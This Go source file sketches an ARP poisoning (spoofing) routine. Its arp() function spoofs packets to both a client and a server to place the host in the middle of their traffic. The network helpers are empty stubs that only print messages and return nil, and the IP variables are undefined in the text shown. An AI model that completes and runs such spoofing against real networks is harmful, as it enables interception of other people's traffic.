package main

import (
	"fmt"
	"time"
)

func arp() error {
	fmt.Println("[*] Starting ARP poisoning cycle...")

	ifcae, err := getNetworkInterface("eth0")
	if err != nil {
		return err
	}
	fmt.Println("[+] Network interface eth0 retrieved")

	myMac, err := getMyMacAddress(ifcae)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Own MAC address retrieved: %v\n", myMac)

	fmt.Printf("[*] Crafting ARP packet: spoofing %s to %s\n", dstIP, srcIP)
	packetClient, err := craftArpPacket(srcIP, dstIP, myMac)
	if err != nil {
		return err
	}
	fmt.Println("[+] ARP packet for client created")

	fmt.Println("[*] Sending ARP packet to client...")
	err = sendARPPacket(ifcae, packetClient)
	if err != nil {
		return err
	}
	fmt.Println("[+] ARP packet sent to client")

	fmt.Printf("[*] Crafting ARP packet: spoofing %s to %s\n", srcIP, dstIP)
	packetServer, err := craftArpPacket(dstIP, srcIP, myMac)
	if err != nil {
		return err
	}
	fmt.Println("[+] ARP packet for server created")

	fmt.Println("[*] Sending ARP packet to server...")
	err = sendARPPacket(ifcae, packetServer)
	if err != nil {
		return err
	}
	fmt.Println("[+] ARP packet sent to server")

	time.Sleep(1 * time.Second)

	return nil
}

func getNetworkInterface(ifaceName string) (interface{}, error) {
	fmt.Printf("[*] Retrieving network interface: %s\n", ifaceName)
	return nil, nil
}

func getMyMacAddress(iface interface{}) ([]byte, error) {
	fmt.Println("[*] Extracting MAC address from interface...")
	return nil, nil
}

func craftArpPacket(tpa, spa string, myMAC []byte) (interface{}, error) {
	fmt.Printf("[*] Building ARP packet: target=%s, sender=%s\n", tpa, spa)
	return nil, nil
}

func sendARPPacket(iface interface{}, packet interface{}) error {
	fmt.Println("[*] Transmitting ARP packet...")
	return nil
}
